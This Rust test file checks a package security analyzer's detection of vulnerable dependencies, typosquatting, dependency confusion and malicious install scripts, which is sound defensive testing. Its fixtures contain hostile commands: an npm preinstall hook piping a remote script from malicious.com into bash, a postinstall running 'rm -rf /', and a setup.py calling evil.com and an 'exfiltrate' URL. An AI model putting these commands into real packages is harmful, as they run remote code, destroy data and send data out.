//! Comprehensive tests for package security analysis

use std::fs;
use tempfile::TempDir;
use threatflux_package_security::{PackageSecurityAnalyzer, RiskLevel};

// Helper to create test package files
fn create_npm_package(dir: &TempDir, package_json: &str) {
    fs::write(dir.path().join("package.json"), package_json).unwrap();
}

fn create_python_package(dir: &TempDir, setup_py: &str, requirements_txt: Option<&str>) {
    fs::write(dir.path().join("setup.py"), setup_py).unwrap();
    if let Some(requirements) = requirements_txt {
        fs::write(dir.path().join("requirements.txt"), requirements).unwrap();
    }
}

fn create_java_package(dir: &TempDir, pom_xml: &str) {
    fs::write(dir.path().join("pom.xml"), pom_xml).unwrap();
}

#[tokio::test]
async fn test_npm_package_vulnerability_detection() {
    let temp_dir = TempDir::new().unwrap();

    // Create package with known vulnerable dependencies
    let vulnerable_package = r#"{
        "name": "vulnerable-test-package",
        "version": "1.0.0",
        "description": "Test package with vulnerabilities",
        "dependencies": {
            "lodash": "4.0.0",
            "moment": "2.10.0",
            "express": "3.0.0"
        },
        "devDependencies": {
            "mocha": "1.0.0"
        }
    }"#;

    create_npm_package(&temp_dir, vulnerable_package);

    let analyzer = PackageSecurityAnalyzer::new().unwrap();
    let result = analyzer.analyze(temp_dir.path()).await.unwrap();

    assert_eq!(result.package_info().package_type(), "npm");
    assert_eq!(result.package_info().name(), "vulnerable-test-package");
    assert_eq!(result.package_info().version(), "1.0.0");

    // Should detect vulnerabilities in these old versions
    let vulnerabilities = result.vulnerabilities();
    assert!(
        !vulnerabilities.is_empty(),
        "Should detect vulnerabilities in old dependencies"
    );

    // Check that we found specific vulnerabilities
    let has_lodash_vuln = vulnerabilities
        .iter()
        .any(|v| v.package_name().contains("lodash"));
    assert!(has_lodash_vuln, "Should detect lodash vulnerabilities");

    // Risk level should be elevated due to vulnerabilities
    assert!(result.overall_risk_level() > RiskLevel::Safe);
}

#[tokio::test]
async fn test_npm_package_malicious_patterns() {
    let temp_dir = TempDir::new().unwrap();

    // Create package with suspicious scripts
    let suspicious_package = r#"{
        "name": "suspicious-test-package",
        "version": "1.0.0",
        "description": "Package with suspicious behavior",
        "scripts": {
            "preinstall": "curl -s http://malicious.com/script.sh | bash",
            "postinstall": "node -e \"require('child_process').exec('rm -rf /')\""
        },
        "dependencies": {
            "express": "^4.18.0"
        }
    }"#;

    create_npm_package(&temp_dir, suspicious_package);

    let analyzer = PackageSecurityAnalyzer::new().unwrap();
    let result = analyzer.analyze(temp_dir.path()).await.unwrap();

    // Should detect malicious patterns
    assert!(
        result.overall_risk_level() >= RiskLevel::High,
        "Should have high risk due to malicious scripts"
    );

    let malicious_indicators = result.malicious_indicators();
    assert!(
        !malicious_indicators.is_empty(),
        "Should detect malicious indicators"
    );

    // Should detect specific dangerous patterns
    let has_remote_exec = malicious_indicators
        .iter()
        .any(|i| i.description().contains("remote") || i.description().contains("curl"));
    assert!(has_remote_exec, "Should detect remote execution pattern");
}

#[tokio::test]
async fn test_npm_typosquatting_detection() {
    let temp_dir = TempDir::new().unwrap();

    // Create packages with names similar to popular packages
    let typosquatting_cases = vec![
        ("loadash", "Similar to lodash"),
        ("expres", "Similar to express"),
        ("reqeust", "Similar to request"),
        ("momnet", "Similar to moment"),
    ];

    for (suspicious_name, _description) in typosquatting_cases {
        let package_json = format!(
            r#"{{
            "name": "{}",
            "version": "1.0.0",
            "description": "Potentially typosquatting package"
        }}"#,
            suspicious_name
        );

        create_npm_package(&temp_dir, &package_json);

        let analyzer = PackageSecurityAnalyzer::new().unwrap();
        let result = analyzer.analyze(temp_dir.path()).await.unwrap();

        // Should detect typosquatting risk
        let typo_risk = result.typosquatting_risk();
        assert!(
            typo_risk.is_potential_typosquatting(),
            "Should detect typosquatting for {}",
            suspicious_name
        );
        assert!(
            !typo_risk.similar_packages().is_empty(),
            "Should find similar legitimate packages"
        );
    }
}

#[tokio::test]
async fn test_python_package_vulnerability_detection() {
    let temp_dir = TempDir::new().unwrap();

    // Create Python package with known vulnerable dependencies
    let vulnerable_setup = r#"
from setuptools import setup

setup(
    name="vulnerable-python-package",
    version="1.0.0",
    description="Python package with vulnerabilities",
    install_requires=[
        "django==1.11.0",
        "flask==0.12.0",
        "requests==2.6.0",
        "pillow==3.0.0"
    ]
)
"#;

    let vulnerable_requirements = r#"
django==1.11.0
flask==0.12.0
requests==2.6.0
pillow==3.0.0
"#;

    create_python_package(&temp_dir, vulnerable_setup, Some(vulnerable_requirements));

    let analyzer = PackageSecurityAnalyzer::new().unwrap();
    let result = analyzer.analyze(temp_dir.path()).await.unwrap();

    assert_eq!(result.package_info().package_type(), "python");
    assert_eq!(result.package_info().name(), "vulnerable-python-package");

    // Should detect vulnerabilities in these old versions
    let vulnerabilities = result.vulnerabilities();
    assert!(
        !vulnerabilities.is_empty(),
        "Should detect vulnerabilities in old Python dependencies"
    );

    // Check for specific vulnerable packages
    let has_django_vuln = vulnerabilities
        .iter()
        .any(|v| v.package_name().contains("django"));
    assert!(has_django_vuln, "Should detect Django vulnerabilities");

    assert!(result.overall_risk_level() > RiskLevel::Safe);
}

#[tokio::test]
async fn test_python_malicious_setup_detection() {
    let temp_dir = TempDir::new().unwrap();

    // Create Python package with malicious setup.py
    let malicious_setup = r#"
import subprocess
import urllib.request
from setuptools import setup

# Malicious code in setup.py
subprocess.run(['curl', '-s', 'http://evil.com/steal.sh'], shell=True)
urllib.request.urlopen('http://malicious.com/exfiltrate')

setup(
    name="malicious-python-package",
    version="1.0.0",
    description="Package with malicious setup",
    install_requires=["requests"]
)
"#;

    create_python_package(&temp_dir, malicious_setup, None);

    let analyzer = PackageSecurityAnalyzer::new().unwrap();
    let result = analyzer.analyze(temp_dir.path()).await.unwrap();

    // Should detect malicious patterns in setup.py
    assert!(
        result.overall_risk_level() >= RiskLevel::High,
        "Should have high risk due to malicious setup.py"
    );

    let malicious_indicators = result.malicious_indicators();
    assert!(
        !malicious_indicators.is_empty(),
        "Should detect malicious indicators in setup.py"
    );

    // Should detect specific dangerous patterns
    let has_network_access = malicious_indicators
        .iter()
        .any(|i| i.description().contains("network") || i.description().contains("urllib"));
    assert!(
        has_network_access,
        "Should detect network access in setup.py"
    );
}

#[tokio::test]
async fn test_python_typosquatting_detection() {
    let temp_dir = TempDir::new().unwrap();

    // Test Python packages with names similar to popular packages
    let typosquatting_cases = vec![
        ("reqeusts", "Similar to requests"),
        ("beatifulsoup", "Similar to beautifulsoup4"),
        ("pillow-pillow", "Similar to pillow"),
        ("sklern", "Similar to sklearn"),
    ];

    for (suspicious_name, _description) in typosquatting_cases {
        let setup_py = format!(
            r#"
from setuptools import setup

setup(
    name="{}",
    version="1.0.0",
    description="Potentially typosquatting package"
)
"#,
            suspicious_name
        );

        create_python_package(&temp_dir, &setup_py, None);

        let analyzer = PackageSecurityAnalyzer::new().unwrap();
        let result = analyzer.analyze(temp_dir.path()).await.unwrap();

        // Should detect typosquatting risk
        let typo_risk = result.typosquatting_risk();
        if typo_risk.is_potential_typosquatting() {
            assert!(
                !typo_risk.similar_packages().is_empty(),
                "Should find similar legitimate packages for {}",
                suspicious_name
            );
        }
        // Note: Typosquatting detection might not catch all cases - that's acceptable
    }
}

#[tokio::test]
async fn test_java_package_vulnerability_detection() {
    let temp_dir = TempDir::new().unwrap();

    // Create Java package with known vulnerable dependencies
    let vulnerable_pom = r#"<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0">
    <modelVersion>4.0.0</modelVersion>
    <groupId>com.example</groupId>
    <artifactId>vulnerable-java-package</artifactId>
    <version>1.0.0</version>
    
    <dependencies>
        <dependency>
            <groupId>org.apache.commons</groupId>
            <artifactId>commons-collections4</artifactId>
            <version>4.0</version>
        </dependency>
        <dependency>
            <groupId>org.springframework</groupId>
            <artifactId>spring-core</artifactId>
            <version>3.0.0</version>
        </dependency>
        <dependency>
            <groupId>org.apache.struts</groupId>
            <artifactId>struts2-core</artifactId>
            <version>2.3.0</version>
        </dependency>
    </dependencies>
</project>"#;

    create_java_package(&temp_dir, vulnerable_pom);

    let analyzer = PackageSecurityAnalyzer::new().unwrap();
    let result = analyzer.analyze(temp_dir.path()).await.unwrap();

    assert_eq!(result.package_info().package_type(), "java");
    assert_eq!(result.package_info().name(), "vulnerable-java-package");

    // Should detect vulnerabilities in these old versions
    let vulnerabilities = result.vulnerabilities();
    if !vulnerabilities.is_empty() {
        assert!(result.overall_risk_level() > RiskLevel::Safe);

        // Check for specific vulnerable packages
        let has_struts_vuln = vulnerabilities
            .iter()
            .any(|v| v.package_name().contains("struts"));
        if has_struts_vuln {
            // Struts has had many serious vulnerabilities
            assert!(result.overall_risk_level() >= RiskLevel::High);
        }
    }
}

#[tokio::test]
async fn test_dependency_confusion_detection() {
    let temp_dir = TempDir::new().unwrap();

    // Create package with internal-style dependency names
    let confusion_package = r#"{
        "name": "internal-company-utils",
        "version": "1.0.0",
        "description": "Potentially confused dependency",
        "dependencies": {
            "@company/internal-lib": "1.0.0",
            "company-secret-module": "2.0.0"
        }
    }"#;

    create_npm_package(&temp_dir, confusion_package);

    let analyzer = PackageSecurityAnalyzer::new().unwrap();
    let result = analyzer.analyze(temp_dir.path()).await.unwrap();

    // Should detect potential dependency confusion
    let malicious_indicators = result.malicious_indicators();
    let has_confusion_risk = malicious_indicators
        .iter()
        .any(|i| i.description().contains("confusion") || i.description().contains("internal"));

    if has_confusion_risk {
        assert!(result.overall_risk_level() >= RiskLevel::Medium);
    }
}

#[tokio::test]
async fn test_benign_package_analysis() {
    let temp_dir = TempDir::new().unwrap();

    // Create a benign package with up-to-date dependencies
    let benign_package = r#"{
        "name": "benign-test-package",
        "version": "1.0.0",
        "description": "A completely safe test package",
        "author": "Test Author <test@example.com>",
        "license": "MIT",
        "dependencies": {
            "lodash": "^4.17.21",
            "express": "^4.18.2"
        },
        "devDependencies": {
            "mocha": "^10.0.0",
            "chai": "^4.3.0"
        },
        "scripts": {
            "test": "mocha",
            "start": "node index.js"
        }
    }"#;

    create_npm_package(&temp_dir, benign_package);

    let analyzer = PackageSecurityAnalyzer::new().unwrap();
    let result = analyzer.analyze(temp_dir.path()).await.unwrap();

    // Should be assessed as safe or low risk
    assert!(
        result.overall_risk_level() <= RiskLevel::Low,
        "Benign package should have low risk"
    );

    // Note: Even recent packages might have some vulnerabilities, so we don't assert empty

    // Should not be flagged as typosquatting
    assert!(
        !result.typosquatting_risk().is_potential_typosquatting(),
        "Benign package should not be flagged as typosquatting"
    );

    // Should have minimal malicious indicators
    let malicious_indicators = result.malicious_indicators();
    assert!(
        malicious_indicators.is_empty() || malicious_indicators.len() <= 1,
        "Benign package should have minimal malicious indicators"
    );
}

#[tokio::test]
async fn test_supply_chain_risk_assessment() {
    let temp_dir = TempDir::new().unwrap();

    // Create package with many dependencies (supply chain risk)
    let complex_package = r#"{
        "name": "complex-dependency-package",
        "version": "1.0.0",
        "description": "Package with many dependencies",
        "dependencies": {
            "express": "^4.18.0",
            "lodash": "^4.17.21",
            "moment": "^2.29.0",
            "axios": "^1.0.0",
            "react": "^18.0.0",
            "react-dom": "^18.0.0",
            "webpack": "^5.0.0",
            "babel-core": "^6.26.0",
            "eslint": "^8.0.0",
            "jest": "^29.0.0"
        }
    }"#;

    create_npm_package(&temp_dir, complex_package);

    let analyzer = PackageSecurityAnalyzer::new().unwrap();
    let result = analyzer.analyze(temp_dir.path()).await.unwrap();

    // Should assess supply chain risk
    let supply_chain_score = result.supply_chain_risk_score();
    assert!(
        supply_chain_score > 0.0,
        "Should have positive supply chain risk score"
    );

    // Many dependencies should increase risk somewhat
    assert!(
        supply_chain_score > 30.0,
        "Many dependencies should increase supply chain risk"
    );
}

#[tokio::test]
async fn test_package_quality_metrics() {
    let temp_dir = TempDir::new().unwrap();

    // Create package with quality indicators
    let quality_package = r#"{
        "name": "high-quality-package",
        "version": "2.1.0",
        "description": "A well-maintained package with quality indicators",
        "author": "Quality Author <author@example.com>",
        "license": "MIT",
        "homepage": "https://github.com/example/high-quality-package",
        "repository": {
            "type": "git",
            "url": "https://github.com/example/high-quality-package.git"
        },
        "bugs": {
            "url": "https://github.com/example/high-quality-package/issues"
        },
        "keywords": ["utility", "helper", "quality"],
        "dependencies": {
            "lodash": "^4.17.21"
        },
        "devDependencies": {
            "mocha": "^10.0.0",
            "chai": "^4.3.0",
            "nyc": "^15.0.0"
        },
        "scripts": {
            "test": "mocha",
            "test-coverage": "nyc mocha",
            "lint": "eslint ."
        }
    }"#;

    create_npm_package(&temp_dir, quality_package);

    let analyzer = PackageSecurityAnalyzer::new().unwrap();
    let result = analyzer.analyze(temp_dir.path()).await.unwrap();

    // Should assess quality positively
    let quality_metrics = result.quality_metrics();
    assert!(
        quality_metrics.documentation_score() > 0.5,
        "Should have good documentation score"
    );
    assert!(
        quality_metrics.has_tests(),
        "Should detect test configuration"
    );
    assert!(
        quality_metrics.has_ci_cd(),
        "Should detect CI/CD indicators"
    );
}

#[tokio::test]
async fn test_error_handling() {
    let analyzer = PackageSecurityAnalyzer::new().unwrap();

    // Test with nonexistent directory
    let result = analyzer.analyze("nonexistent_directory").await;
    assert!(result.is_err(), "Should fail for nonexistent directory");

    // Test with empty directory
    let empty_dir = TempDir::new().unwrap();
    let result = analyzer.analyze(empty_dir.path()).await;
    assert!(
        result.is_err(),
        "Should fail for directory with no package files"
    );

    // Test with invalid JSON
    let invalid_dir = TempDir::new().unwrap();
    fs::write(invalid_dir.path().join("package.json"), "invalid json {").unwrap();
    let result = analyzer.analyze(invalid_dir.path()).await;
    assert!(result.is_err(), "Should fail for invalid JSON");
}

#[tokio::test]
async fn test_concurrent_analysis() {
    use std::sync::Arc;
    use tokio::task;

    let analyzer = Arc::new(PackageSecurityAnalyzer::new().unwrap());
    let num_tasks = 5;

    let mut handles = vec![];

    for i in 0..num_tasks {
        let analyzer_clone = Arc::clone(&analyzer);
        let handle = task::spawn(async move {
            let temp_dir = TempDir::new().unwrap();
            let package_json = format!(
                r#"{{
                "name": "concurrent-test-package-{}",
                "version": "1.0.0",
                "description": "Concurrent test package",
                "dependencies": {{
                    "lodash": "^4.17.21"
                }}
            }}"#,
                i
            );

            create_npm_package(&temp_dir, &package_json);

            let result = analyzer_clone.analyze(temp_dir.path()).await.unwrap();
            assert_eq!(
                result.package_info().name(),
                format!("concurrent-test-package-{}", i)
            );
            result
        });
        handles.push(handle);
    }

    // Wait for all analyses to complete
    for handle in handles {
        let result = handle.await.unwrap();
        assert!(result.overall_risk_level() <= RiskLevel::Medium);
    }
}

#[tokio::test]
async fn test_performance_with_large_package() {
    let temp_dir = TempDir::new().unwrap();

    // Create package with many dependencies
    let mut dependencies = String::new();
    for i in 0..100 {
        if i > 0 {
            dependencies.push(',');
        }
        dependencies.push_str(&format!("\"package-{}\": \"1.0.0\"", i));
    }

    let large_package = format!(
        r#"{{
        "name": "large-test-package",
        "version": "1.0.0",
        "description": "Package with many dependencies",
        "dependencies": {{
            {}
        }}
    }}"#,
        dependencies
    );

    create_npm_package(&temp_dir, &large_package);

    let analyzer = PackageSecurityAnalyzer::new().unwrap();
    let start_time = std::time::Instant::now();

    let result = analyzer.analyze(temp_dir.path()).await.unwrap();
    let analysis_time = start_time.elapsed();

    // Should complete in reasonable time
    assert!(
        analysis_time.as_secs() < 30,
        "Analysis should complete within 30 seconds"
    );

    // Should handle large number of dependencies
    assert_eq!(result.package_info().name(), "large-test-package");
    assert!(
        result.supply_chain_risk_score() > 50.0,
        "Should have high supply chain risk"
    );
}

#[test]
fn test_risk_level_comparisons() {
    use threatflux_package_security::RiskLevel;

    // Test ordering
    assert!(RiskLevel::Safe < RiskLevel::Low);
    assert!(RiskLevel::Low < RiskLevel::Medium);
    assert!(RiskLevel::Medium < RiskLevel::High);
    assert!(RiskLevel::High < RiskLevel::Critical);

    // Test equality
    assert_eq!(RiskLevel::Safe, RiskLevel::Safe);
    assert_eq!(RiskLevel::Critical, RiskLevel::Critical);

    // Test inequality
    assert_ne!(RiskLevel::Safe, RiskLevel::Critical);
    assert_ne!(RiskLevel::Low, RiskLevel::High);
}

#[test]
fn test_package_type_detection() {
    use threatflux_package_security::PackageType;

    // Test package type variants
    assert_eq!(PackageType::Npm.to_string(), "npm");
    assert_eq!(PackageType::Python.to_string(), "python");
    assert_eq!(PackageType::Java.to_string(), "java");
    assert_eq!(PackageType::Unknown.to_string(), "unknown");
}

#[tokio::test]
async fn test_vulnerability_severity_classification() {
    let temp_dir = TempDir::new().unwrap();

    // Create package with known critical vulnerabilities
    let critical_vuln_package = r#"{
        "name": "critical-vuln-package",
        "version": "1.0.0",
        "description": "Package with critical vulnerabilities",
        "dependencies": {
            "node-serialize": "0.0.4",
            "handlebars": "4.0.5"
        }
    }"#;

    create_npm_package(&temp_dir, critical_vuln_package);

    let analyzer = PackageSecurityAnalyzer::new().unwrap();
    let result = analyzer.analyze(temp_dir.path()).await.unwrap();

    let vulnerabilities = result.vulnerabilities();
    if !vulnerabilities.is_empty() {
        // Check that vulnerabilities are properly classified
        for vuln in vulnerabilities {
            assert!(
                !vuln.cve_id().is_empty() || !vuln.advisory_id().is_empty(),
                "Vulnerability should have ID"
            );
            assert!(
                !vuln.description().is_empty(),
                "Vulnerability should have description"
            );
            assert!(
                vuln.severity_score() >= 0.0 && vuln.severity_score() <= 10.0,
                "Severity score should be valid CVSS range"
            );
        }
    }
}
